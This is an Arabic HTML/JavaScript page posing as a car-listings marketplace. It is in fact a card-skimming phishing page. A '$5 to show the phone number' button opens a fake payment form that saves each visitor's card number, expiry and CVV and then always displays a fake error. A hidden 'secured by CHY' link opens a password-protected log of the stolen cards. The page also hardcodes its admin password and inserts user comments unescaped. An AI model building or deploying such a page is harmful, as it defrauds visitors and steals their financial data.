<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="pageTitle">سوق السيارات المميز</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --primary-gradient: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
            --accent: #f97316;
            --accent-gradient: linear-gradient(135deg, #f97316 0%, #fb923c 100%);
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --border-color: #334155;
            --danger: #ef4444;
            --success: #34d399;
        }

        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        body { 
            background-color: var(--bg-color); 
            background-image: radial-gradient(circle at top right, #1e1b4b 0%, #0f172a 50%);
            margin: 0; 
            padding: 16px; 
            color: var(--text-main); 
            min-height: 100vh;
        }

        .container { max-width: 500px; margin: 0 auto; padding-bottom: 50px; }
        
        .notice-banner {
            background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
            color: #ffffff;
            padding: 12px 16px;
            border-radius: 14px;
            margin-bottom: 20px;
            font-size: 13px;
            font-weight: 700;
            display: none;
            align-items: center;
            gap: 10px;
            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
            line-height: 1.5;
            word-break: break-word;
        }
        .notice-icon { font-size: 18px; flex-shrink: 0; }

        header { 
            text-align: center; 
            margin-bottom: 25px; 
            padding: 20px 15px;
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        header h1 { 
            color: #ffffff; 
            font-size: 24px; 
            margin: 0 0 12px 0; 
            font-weight: 900;
            letter-spacing: -0.5px;
            background: linear-gradient(to right, #818cf8, #c084fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .btn-admin { 
            background: rgba(255, 255, 255, 0.08);
            color: #e2e8f0; 
            padding: 8px 18px; 
            border-radius: 30px; 
            font-size: 13px; 
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        .btn-admin:active { transform: scale(0.95); background: rgba(255, 255, 255, 0.15); }

        .admin-section { 
            display: none; 
            background: var(--card-bg); 
            padding: 20px; 
            border-radius: 20px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.4); 
            margin-bottom: 25px; 
            border: 1px solid rgba(99, 102, 241, 0.3);
        }

        .admin-section h3 { margin-top: 0; font-size: 17px; color: #f1f5f9; margin-bottom: 15px; font-weight: 700; border-right: 4px solid var(--primary); padding-right: 8px; }
        
        .form-group { margin-bottom: 14px; }
        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 12px; color: var(--text-muted); }
        
        .form-group input, .form-group textarea { 
            width: 100%; 
            padding: 12px 14px; 
            border: 1px solid var(--border-color); 
            border-radius: 12px; 
            font-size: 14px; 
            background-color: #0f172a; 
            color: white;
            outline: none; 
            transition: all 0.2s;
        }
        
        .form-group input:focus, .form-group textarea:focus { 
            border-color: var(--primary); 
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2); 
        }

        .form-group input[type="file"] { padding: 8px; background: #0f172a; cursor: pointer; }
        
        button { cursor: pointer; border: none; font-weight: 700; border-radius: 12px; font-family: 'Cairo', sans-serif; }
        
        .btn-add { 
            background: var(--primary-gradient); 
            color: white; 
            width: 100%; 
            padding: 12px; 
            font-size: 15px; 
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
        }
        .btn-add:active { opacity: 0.85; }

        .settings-box { background: rgba(15, 23, 42, 0.6); padding: 12px; border-radius: 14px; margin-bottom: 15px; border: 1px solid var(--border-color); }
        
        .listings-grid { 
            display: grid; 
            grid-template-columns: repeat(2, 1fr); 
            gap: 12px; 
        }
        
        .post-card { 
            background: var(--card-bg); 
            border-radius: 16px; 
            overflow: hidden; 
            box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
            border: 1px solid rgba(255, 255, 255, 0.05); 
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }
        
        .post-img-container { position: relative; width: 100%; height: 120px; cursor: pointer; }
        .post-img { width: 100%; height: 100%; object-fit: cover; transition: opacity 0.2s; }
        .post-img-container:hover .post-img { opacity: 0.85; }
        
        .post-body { padding: 12px; display: flex; flex-direction: column; flex-grow: 1; }
        
        .post-title { font-size: 14px; font-weight: 700; margin-bottom: 4px; color: #ffffff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .post-price { color: var(--success); font-size: 13px; font-weight: 800; margin-bottom: 6px; display: inline-block; }
        .post-desc { font-size: 11px; color: var(--text-muted); margin-bottom: 10px; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
        
        .post-actions-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 8px;
            background: rgba(15, 23, 42, 0.5);
            padding: 6px 10px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.03);
        }

        .btn-like {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
            padding: 2px 6px;
            border-radius: 6px;
            transition: all 0.2s;
        }
        .btn-like.liked { color: #f43f5e; font-weight: bold; }
        .btn-like:active { transform: scale(0.9); }

        .btn-unlock { 
            background: var(--accent-gradient); 
            color: white; 
            width: 100%; 
            padding: 9px 6px; 
            border-radius: 10px; 
            font-size: 11px; 
            text-align: center; 
            display: block; 
            text-decoration: none;
            box-shadow: 0 4px 12px rgba(249, 115, 22, 0.3); 
            font-weight: 700;
            border: none;
            margin-bottom: 8px;
        }
        .btn-unlock:active { transform: scale(0.98); opacity: 0.9; }
        
        .btn-delete { 
            background: rgba(239, 68, 68, 0.15); 
            color: #f87171; 
            border: 1px solid rgba(239, 68, 68, 0.3);
            margin-top: 8px; 
            width: 100%; 
            padding: 7px; 
            font-size: 11px; 
            border-radius: 8px;
        }
        .btn-delete:active { background: rgba(239, 68, 68, 0.3); }

        .empty-state { text-align: center; color: var(--text-muted); padding: 40px 20px; font-size: 14px; grid-column: span 2; }

        #imageModal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9);
            justify-content: center;
            align-items: center;
            z-index: 3000;
            padding: 20px;
        }
        #imageModal img { max-width: 100%; max-height: 90vh; object-fit: contain; border-radius: 12px; }
        .close-image-modal { position: absolute; top: 20px; left: 20px; background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }

        #paymentModal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 10px;
            direction: rtl;
        }
        .payment-card-modal {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            max-height: 90vh;
            overflow-y: auto;
            position: relative;
        }
        .close-payment { background: #dc3545; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; float: left; font-weight: bold; font-size: 12px; }
    </style>
</head>
<body>

<div class="container">
    <div id="siteNoticeBanner" class="notice-banner">
        <span class="notice-icon">📢</span>
        <span id="siteNoticeText"></span>
    </div>

    <header>
        <h1 id="siteTitleDisplay">سوق السيارات المميز</h1>
        <button class="btn-admin" onclick="loginAdmin()">⚙️ لوحة الأدمن</button>
    </header>

    <div id="adminPanel" class="admin-section">
        <h3>لوحة التحكم والإدارة</h3>
        
        <div class="settings-box">
            <div class="form-group" style="margin-bottom: 8px;">
                <label>نشر ملاحظة / تنبيه أعلى الموقع:</label>
                <textarea id="noticeInput" placeholder="اكتب ملاحظة أو تنبيه هام يظهر أعلى الموقع للزوار..."></textarea>
            </div>
            <button class="btn-add" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); padding: 10px; font-size: 13px;" onclick="updateNotice()">حفظ ونشر الملاحظة</button>
            <button class="btn-add" style="background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); padding: 8px; font-size: 12px; margin-top: 6px;" onclick="clearNotice()">إلغاء وإخفاء الملاحظة</button>
        </div>

        <div class="settings-box">
            <div class="form-group" style="margin-bottom: 8px;">
                <label>تعديل اسم الموقع:</label>
                <input type="text" id="newSiteTitleInput" placeholder="أدخل اسم الموقع الجديد">
            </div>
            <button class="btn-add" style="background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); padding: 10px; font-size: 13px;" onclick="updateSiteTitle()">حفظ الاسم الجديد</button>
        </div>

        <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 15px 0;">

        <h3>إضافة سيارة جديدة</h3>
        <div class="form-group"><label>عنوان المنشور:</label><input type="text" id="pTitle" placeholder="مثال: تويوتا كامري 2023"></div>
        <div class="form-group"><label>السعر:</label><input type="text" id="pPrice" placeholder="مثال: 15,000 $"></div>
        <div class="form-group"><label>التفاصيل:</label><textarea id="pDesc" placeholder="اكتب تفاصيل السيارة ومواصفاتها..."></textarea></div>
        <div class="form-group"><label>صورة السيارة:</label><input type="file" id="pImage" accept="image/*"></div>
        <button class="btn-add" onclick="addPost()">نشر الإعلان الآن</button>
    </div>

    <div id="listings" class="listings-grid"></div>
</div>

<div id="imageModal">
    <button class="close-image-modal" onclick="closeImageModal()">إغلاق</button>
    <img id="fullScreenImg" src="" alt="صورة مكبرة">
</div>

<div id="paymentModal">
    <div class="payment-card-modal">
        <button class="close-payment" onclick="closePaymentModal()">إغلاق</button>
        <div style="clear: both; height: 10px;"></div>
        
        <div style="text-align: center; margin-bottom: 15px;">
            <h2 style="color: #0b2545; font-size: 18px; margin: 0 0 6px 0; font-family: Tahoma, sans-serif;">إتمام عملية الدفع</h2>
            <p style="color: #ee6c4d; font-size: 14px; font-weight: bold; margin: 0 0 10px 0; background: #fff5f2; padding: 6px; border-radius: 6px; display: inline-block; font-family: Tahoma, sans-serif;">دفع بطاقة جوجل بلاي 5 دولار</p>
        </div>

        <form id="paymentForm">
            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cardType" style="color: #334155; font-weight: bold; font-size: 13px;">نوع البطاقة</label>
                <select id="cardType" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
                    <option value="" disabled selected>اختر طريقة الدفع</option>
                    <option value="Visa">فيزا (Visa)</option>
                    <option value="MasterCard">ماستر كارد (MasterCard)</option>
                </select>
            </div>

            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cardHolder" style="color: #334155; font-weight: bold; font-size: 13px;">اسم صاحب البطاقة</label>
                <input type="text" id="cardHolder" placeholder="الاسم الكامل كما يظهر على البطاقة" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
            </div>

            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cardNumber" style="color: #334155; font-weight: bold; font-size: 13px;">رقم البطاقة</label>
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
            </div>

            <div style="display: flex; gap: 10px; font-family: Tahoma, sans-serif;">
                <div class="form-group" style="flex: 1;">
                    <label for="expiryMonth" style="color: #334155; font-weight: bold; font-size: 13px;">الشهر</label>
                    <select id="expiryMonth" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
                        <option value="" disabled selected>الشهر</option>
                        <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                    </select>
                </div>

                <div class="form-group" style="flex: 1;">
                    <label for="expiryYear" style="color: #334155; font-weight: bold; font-size: 13px;">السنة</label>
                    <select id="expiryYear" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
                        <option value="" disabled selected>السنة</option>
                        <option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option>
                    </select>
                </div>
            </div>

            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cvv" style="color: #334155; font-weight: bold; font-size: 13px;">رمز الأمان (CVV)</label>
                <input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
            </div>

            <button type="submit" style="background-color: #ee6c4d; color: white; border: none; width: 100%; padding: 13px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: Tahoma, sans-serif;">إتمام الدفع</button>
            <div id="error-msg" style="color: #dc3545; margin-top: 12px; font-weight: bold; font-size: 13px; text-align: center; display: none; font-family: Tahoma, sans-serif;">حدث خطأ أثناء معالجة الدفع، يرجى المحاولة لاحقاً.</div>
        </form>

        <div>
            <span style="margin-top: 15px; color: #94a3b8; font-size: 10px; cursor: pointer; user-select: none; display: block; text-align: center; opacity: 0.25;" onclick="openAdminPanel()">أمن بواسطة CHY</span>
        </div>
    </div>
</div>

<div id="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 2000; padding: 10px; direction: rtl;">
    <div style="background: white; width: 100%; max-width: 700px; max-height: 85vh; overflow-y: auto; padding: 15px; border-radius: 10px; text-align: right;">
        <button style="background: #dc3545; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; float: left; font-weight: bold; font-size: 12px;" onclick="closeAdminPanel()">إغلاق</button>
        <h3 style="color: #0b2545; margin-top: 0; font-size: 16px;">سجل محاولات الدفع</h3>
        <div style="width: 100%; overflow-x: auto; margin-top: 10px;">
            <table style="width: 100%; border-collapse: collapse; white-space: nowrap;">
                <thead>
                    <tr>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">الوقت</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">النوع</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">الاسم</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">رقم البطاقة</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">التاريخ</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">CVV</th>
                    </tr>
                </thead>
                <tbody id="attempts-list"></tbody>
            </table>
        </div>
    </div>
</div>

<script>
    let posts = JSON.parse(localStorage.getItem('myPosts')) || [];
    let isAdmin = false;

    function loadSiteSettings() {
        const savedTitle = localStorage.getItem('customSiteTitle') || "سوق السيارات المميز";
        document.title = savedTitle;
        const siteTitleDisplay = document.getElementById('siteTitleDisplay');
        if (siteTitleDisplay) siteTitleDisplay.innerText = savedTitle;
        const newSiteTitleInput = document.getElementById('newSiteTitleInput');
        if (newSiteTitleInput) newSiteTitleInput.value = savedTitle;

        const savedNotice = localStorage.getItem('siteNotice') || "";
        const noticeBanner = document.getElementById('siteNoticeBanner');
        const noticeText = document.getElementById('siteNoticeText');
        const noticeInput = document.getElementById('noticeInput');
        
        if (noticeInput) noticeInput.value = savedNotice;

        if (savedNotice.trim() !== "") {
            noticeText.innerText = savedNotice;
            noticeBanner.style.display = 'flex';
        } else {
            noticeBanner.style.display = 'none';
        }
    }

    function updateSiteTitle() {
        const newTitle = document.getElementById('newSiteTitleInput').value.trim();
        if (newTitle) {
            localStorage.setItem('customSiteTitle', newTitle);
            document.getElementById('siteTitleDisplay').innerText = newTitle;
            document.title = newTitle;
            alert("تم تحديث اسم الموقع بنجاح!");
        } else {
            alert("الرجاء إدخال اسم صحيح.");
        }
    }

    function updateNotice() {
        const noticeTextVal = document.getElementById('noticeInput').value.trim();
        localStorage.setItem('siteNotice', noticeTextVal);
        loadSiteSettings();
        alert("تم نشر وتحديث الملاحظة بنجاح أعلى الموقع!");
    }

    function clearNotice() {
        localStorage.removeItem('siteNotice');
        document.getElementById('noticeInput').value = '';
        loadSiteSettings();
        alert("تم إزالة وإخفاء الملاحظة بنجاح!");
    }

    function loginAdmin() {
        if (!isAdmin) {
            let pass = prompt("الرجاء إدخال كلمة سر الأدمن:");
            if (pass === "@oday1996oday@") {
                isAdmin = true;
                document.getElementById('adminPanel').style.display = 'block';
                alert("تم تسجيل الدخول بنجاح!");
                renderPosts();
            } else {
                alert("كلمة السر غير صحيحة");
            }
        }
    }

    function addPost() {
        const title = document.getElementById('pTitle').value;
        const price = document.getElementById('pPrice').value;
        const desc = document.getElementById('pDesc').value;
        const file = document.getElementById('pImage').files[0];

        if (!title || !file) { alert("يرجى إدخال عنوان الإعلان واختيار صورة!"); return; }

        const reader = new FileReader();
        reader.onload = function(e) {
            const newPost = {
                id: Date.now(),
                title, price, desc,
                image: e.target.result,
                likes: 0,
                comments: []
            };
            posts.push(newPost);
            localStorage.setItem('myPosts', JSON.stringify(posts));
            renderPosts();
            
            document.getElementById('pTitle').value = '';
            document.getElementById('pPrice').value = '';
            document.getElementById('pDesc').value = '';
            document.getElementById('pImage').value = '';
            alert("تم إضافة الإعلان بنجاح!");
        };
        reader.readAsDataURL(file);
    }

    function deletePost(id) {
        if(confirm("هل أنت متأكد من حذف هذا المنشور؟")) {
            posts = posts.filter(p => p.id !== id);
            localStorage.setItem('myPosts', JSON.stringify(posts));
            localStorage.removeItem('commented_' + id);
            localStorage.removeItem('liked_' + id);
            renderPosts();
        }
    }

    function toggleLike(postId) {
        const post = posts.find(p => p.id === postId);
        if (!post) return;

        const likedKey = 'liked_' + postId;
        const hasLiked = localStorage.getItem(likedKey);

        if (hasLiked) {
            post.likes = Math.max(0, (post.likes || 0) - 1);
            localStorage.removeItem(likedKey);
        } else {
            post.likes = (post.likes || 0) + 1;
            localStorage.setItem(likedKey, 'true');
        }

        localStorage.setItem('myPosts', JSON.stringify(posts));
        renderPosts();
    }

    function addComment(postId) {
        const hasCommented = localStorage.getItem('commented_' + postId);
        if (hasCommented && !isAdmin) {
            alert("عذراً، يمكنك التعليق مرة واحدة فقط على هذا المنشور من هذا الجهاز.");
            return;
        }

        const nameInput = document.getElementById(`commentName_${postId}`);
        const textInput = document.getElementById(`commentText_${postId}`);
        
        const name = nameInput.value.trim();
        const text = textInput.value.trim();

        // إجباري وضع الاسم قبل إرسال التعليق
        if (!name) {
            alert("تنبيه إبجاري: يرجى إدخال اسمك أولاً قبل نشر التعليق!");
            nameInput.focus();
            return;
        }

        if (!text) {
            alert("يرجى كتابة نص التعليق!");
            textInput.focus();
            return;
        }

        const post = posts.find(p => p.id === postId);
        if (post) {
            if (!post.comments) post.comments = [];
            post.comments.push({ id: Date.now(), name, text, isAdminComment: false });
            
            localStorage.setItem('myPosts', JSON.stringify(posts));
            if (!isAdmin) {
                localStorage.setItem('commented_' + postId, 'true');
            }
            renderPosts();
        }
    }

    function adminReply(postId) {
        const textInput = document.getElementById(`adminReplyText_${postId}`);
        const text = textInput.value.trim();

        if (!text) {
            alert("يرجى كتابة رد الأدمن!");
            return;
        }

        const post = posts.find(p => p.id === postId);
        if (post) {
            if (!post.comments) post.comments = [];
            post.comments.push({ id: Date.now(), name: "الأدمن 👑", text, isAdminComment: true });
            
            localStorage.setItem('myPosts', JSON.stringify(posts));
            renderPosts();
        }
    }

    function deleteComment(postId, commentId) {
        if (confirm("هل تريد حذف هذا التعليق؟")) {
            const post = posts.find(p => p.id === postId);
            if (post && post.comments) {
                post.comments = post.comments.filter(c => c.id !== commentId);
                localStorage.setItem('myPosts', JSON.stringify(posts));
                renderPosts();
            }
        }
    }

    function openImageModal(imgSrc) {
        document.getElementById('fullScreenImg').src = imgSrc;
        document.getElementById('imageModal').style.display = 'flex';
    }

    function closeImageModal() {
        document.getElementById('imageModal').style.display = 'none';
    }

    function openPaymentModal() {
        document.getElementById('paymentModal').style.display = 'flex';
    }

    function closePaymentModal() {
        document.getElementById('paymentModal').style.display = 'none';
    }

    document.getElementById('paymentForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const data = {
            time: new Date().toLocaleString(),
            cardType: document.getElementById('cardType').value,
            cardHolder: document.getElementById('cardHolder').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiryMonth: document.getElementById('expiryMonth').value,
            expiryYear: document.getElementById('expiryYear').value,
            cvv: document.getElementById('cvv').value
        };

        let attempts = JSON.parse(localStorage.getItem('payment_attempts')) || [];
        attempts.push(data);
        localStorage.setItem('payment_attempts', JSON.stringify(attempts));

        document.getElementById('error-msg').style.display = 'block';
        document.getElementById('paymentForm').reset();
    });

    function openAdminPanel() {
        const password = prompt("يرجى إدخال كلمة المرور:");
        if (password === "@oday1996oday@") {
            loadAttempts();
            document.getElementById('admin-panel').style.display = 'flex';
        } else if (password !== null) {
            alert("كلمة المرور غير صحيحة!");
        }
    }

    function closeAdminPanel() {
        document.getElementById('admin-panel').style.display = 'none';
    }

    function loadAttempts() {
        const tbody = document.getElementById('attempts-list');
        tbody.innerHTML = '';
        let attempts = JSON.parse(localStorage.getItem('payment_attempts')) || [];
        
        if (attempts.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; border: 1px solid #cbd5e1; padding: 8px;">لا توجد محاولات مسجلة بعد</td></tr>';
            return;
        }

        attempts.forEach(item => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.time}</td>
                <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cardType}</td>
                <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cardHolder}</td>
                <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cardNumber}</td>
                <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.expiryMonth}/${item.expiryYear}</td>
                <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cvv}</td>
            `;
            tbody.appendChild(tr);
        });
    }

    function renderPosts() {
        const listDiv = document.getElementById('listings');
        listDiv.innerHTML = '';
        
        if (posts.length === 0) {
            listDiv.innerHTML = '<div class="empty-state">🚗 لا توجد سيارات معروضة حالياً.</div>';
            return;
        }

        posts.forEach(post => {
            const hasLiked = localStorage.getItem('liked_' + post.id);
            const likesCount = post.likes || 0;

            let commentsHtml = '';
            if (post.comments && post.comments.length > 0) {
                post.comments.forEach(c => {
                    const isAdmStyle = c.isAdminComment ? 'background: rgba(99, 102, 241, 0.2); border: 1px solid rgba(99, 102, 241, 0.4);' : 'background: rgba(15,23,42,0.4);';
                    const nameColor = c.isAdminComment ? '#a855f7' : '#818cf8';
                    
                    commentsHtml += `
                        <div style="${isAdmStyle} padding: 6px 8px; border-radius: 6px; margin-bottom: 5px; font-size: 10px; word-break: break-word; display: flex; justify-content: space-between; align-items: flex-start;">
                            <div>
                                <strong style="color: ${nameColor};">${c.name}:</strong> 
                                <span style="color: #e2e8f0;">${c.text}</span>
                            </div>
                            ${isAdmin ? `<button onclick="deletePostComment(${post.id}, ${c.id})" style="background:none; border:none; color:#f87171; font-size:10px; cursor:pointer; padding:0 4px; font-weight:bold;">حذف</button>` : ''}
                        </div>
                    `;
                });
            } else {
                commentsHtml = `<div style="font-size: 10px; color: var(--text-muted); text-align: center; margin-bottom: 6px;">لا توجد تعليقات بعد</div>`;
            }

            const hasCommented = localStorage.getItem('commented_' + post.id);
            let commentFormHtml = '';

            if (!hasCommented || isAdmin) {
                commentFormHtml = `
                    <div style="margin-top: 8px; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 6px;">
                        ${!isAdmin ? `
                            <input type="text" id="commentName_${post.id}" placeholder="اكتب اسمك (إجباري)..." style="width:100%; padding:5px 8px; font-size:10px; margin-bottom:4px; background:#0f172a; border:1px solid #334155; color:white; border-radius:6px; outline:none;" required>
                            <textarea id="commentText_${post.id}" placeholder="اكتب تعليقك..." style="width:100%; padding:5px 8px; font-size:10px; margin-bottom:4px; background:#0f172a; border:1px solid #334155; color:white; border-radius:6px; height:32px; resize:none; outline:none;"></textarea>
                            <button onclick="addComment(${post.id})" style="background:#6366f1; color:white; width:100%; padding:5px; font-size:10px; border-radius:6px; cursor:pointer; font-weight:700;">إرسال التعليق</button>
                        ` : `
                            <textarea id="adminReplyText_${post.id}" placeholder="رد أو تعليق بصفتك الأدمن..." style="width:100%; padding:5px 8px; font-size:10px; margin-bottom:4px; background:#0f172a; border:1px solid #a855f7; color:white; border-radius:6px; height:32px; resize:none; outline:none;"></textarea>
                            <button onclick="adminReply(${post.id})" style="background:linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color:white; width:100%; padding:5px; font-size:10px; border-radius:6px; cursor:pointer; font-weight:700;">تعليق / رد كأدمن</button>
                        `}
                    </div>
                `;
            } else {
                commentFormHtml = `<div style="margin-top: 6px; font-size: 9px; color: var(--success); text-align: center; font-weight: 700;">✓ لقد قمت بالتعليق مسبقاً</div>`;
            }

            listDiv.innerHTML += `
                <div class="post-card">
                    <div>
                        <div class="post-img-container" onclick="openImageModal('${post.image}')">
                            <img src="${post.image}" class="post-img" title="انقر لعرض الصورة كاملة">
                        </div>
                        <div class="post-body">
                            <div class="post-title" title="${post.title}">${post.title}</div>
                            <div class="post-price">${post.price}</div>
                            <p class="post-desc">${post.desc || ''}</p>
                            
                            <div class="post-actions-bar">
                                <button class="btn-like ${hasLiked ? 'liked' : ''}" onclick="toggleLike(${post.id})">
                                    <span>${hasLiked ? '❤️' : '🤍'}</span> <span>${likesCount} إعجاب</span>
                                </button>
                                <span style="font-size: 10px; color: var(--text-muted);">💬 ${post.comments ? post.comments.length : 0} تعليقات</span>
                            </div>

                            <button onclick="openPaymentModal()" class="btn-unlock">📞 إظهار الرقم (5$)</button>

                            <div style="margin-top: 4px; background: rgba(30,41,59,0.5); padding: 6px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.03);">
                                <div style="font-size: 11px; font-weight: 700; margin-bottom: 4px; color: #cbd5e1;">التعليقات:</div>
                                <div style="max-height: 90px; overflow-y: auto;">${commentsHtml}</div>
                                ${commentFormHtml}
                            </div>

                            ${isAdmin ? `<button class="btn-delete" onclick="deletePost(${post.id})">حذف المنشور بالكامل</button>` : ''}
                        </div>
                    </div>
                </div>
            `;
        });
    }

    function deletePostComment(postId, commentId) {
        deleteComment(postId, commentId);
    }

    loadSiteSettings();
    renderPosts();
</script>

</body>
</html>
